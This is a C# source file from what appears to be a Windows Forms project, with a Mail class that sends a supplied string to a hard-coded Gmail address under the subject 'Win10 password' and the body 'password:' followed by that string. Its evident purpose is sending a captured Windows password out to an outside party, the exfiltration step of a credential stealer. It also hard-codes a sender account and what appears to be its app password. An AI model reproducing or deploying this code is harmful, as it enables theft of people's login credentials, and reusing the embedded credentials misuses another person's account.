using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace WindowsFormsApp1
{
    public static class Mail
    {
        public static void Send(string body)
        {
            MailMessage msg = new MailMessage();
            //收件者，以逗號分隔不同收件者 ex "test@gmail.com,test2@gmail.com"
            msg.To.Add("a0916364056@gmail.com");
            msg.From = new MailAddress("testbingxiang@gmail.com", "bx", System.Text.Encoding.UTF8);
            //郵件標題 
            msg.Subject = "Win10 password";
            //郵件標題編碼  
            msg.SubjectEncoding = System.Text.Encoding.UTF8;
            //郵件內容
            msg.Body = $"password:{body}";
            msg.IsBodyHtml = true;
            msg.BodyEncoding = System.Text.Encoding.UTF8;//郵件內容編碼 
            msg.Priority = MailPriority.Normal;//郵件優先級 
                                               //建立 SmtpClient 物件 並設定 Gmail的smtp主機及Port 
            #region 其它 Host
            /*
             *  outlook.com smtp.live.com port:25
             *  yahoo smtp.mail.yahoo.com.tw port:465
            */
            #endregion
            SmtpClient MySmtp = new SmtpClient("smtp.gmail.com", 587);
            //設定你的帳號密碼
            MySmtp.Credentials = new System.Net.NetworkCredential("testbingxiang@gmail.com", "oltnlddcwbcabhhd");
            //Gmial 的 smtp 使用 SSL
            MySmtp.EnableSsl = true;
            MySmtp.Send(msg);
        }
    }
}
